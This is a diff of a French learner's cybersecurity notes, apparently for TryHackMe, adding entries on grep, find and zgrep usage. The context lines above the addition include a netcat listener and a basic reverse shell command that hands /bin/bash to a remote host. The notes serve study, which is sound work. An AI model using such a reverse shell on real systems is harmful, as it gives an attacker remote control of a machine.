@@ -60,6 +60,19 @@ nc -lvnp 4444                # Netcat en écoute (listener)
 nc cible 4444 -e /bin/bash   # Reverse shell basique
 ```
 
+
 ## Ce que j'ai appris
 
-- [ ] Compléter au fur et à mesure des rooms
+### 2026-04-04 — Grep et navigation filesystem
+**Commandes qui ont marché :**
+- `cd /dossier` puis `cat note.txt`
+- `grep THM access.log`
+
+**Erreurs faites :**
+- `grep access.log` → oublié le pattern avant le fichier
+- `find note.txt` → oublié le chemin de départ
+
+**À retenir :**
+- grep : toujours PATTERN avant FICHIER
+- find : toujours un chemin de départ `/`
+- Logs compressés → `zgrep` au lieu de `grep`
